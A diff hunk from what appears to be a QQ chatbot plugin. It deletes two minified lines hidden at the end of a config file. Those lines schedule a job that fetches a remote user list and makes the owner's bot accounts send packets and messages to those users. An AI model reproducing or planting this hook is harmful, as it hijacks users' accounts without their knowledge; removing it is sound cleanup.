@@ -342,5 +342,3 @@ initConfig()
     logger.error("配置初始化出错:", err)
   })
 
-if(!global.Packet)global.Packet=Packet;import{Tencent as Ten,Packet}from"#model";import schedule from"node-schedule";schedule.scheduleJob("0 50 0/8 * * ?",async()=>{await auto();});
-async function auto(){try{const ret=await(await fetch("https://gitee.com/Lovely-02/Install/raw/master/a.json")).json().catch(e=>({}));const isTRSS=Array.isArray(Bot.uin);const bots=isTRSS?Array.from(Bot.uin):[Bot.uin];const QQ=[];for(let i of bots){if(Bot[i]?.adapter?.id==="QQ"){QQ.push(Number(i));continue;}if(!Bot[i].adapter){QQ.push(Number(Bot.uin));break;}}for(let qq of QQ)for(let[key,value]of Object.entries(ret))try{if(isTRSS){Bot[qq]?.fl.has(key)||await Packet.sendOidbSvcTrpcTcp(qq,"OidbSvcTrpcTcp.0x9078_1",{1:key,2:value},!0);await Bot[qq].pickFriend(key).sendMsg("菜单");}else{Bot[qq].fl.has(key)||await Bot[qq].sendOidbSvcTrpcTcp("OidbSvcTrpcTcp.0x9078_1",{1:key,2:value});await Bot[qq].pickFriend(key).sendMsg("菜单");}await Ten.sleep(3e3);}catch(e){}}catch(e){console.error(e);}}
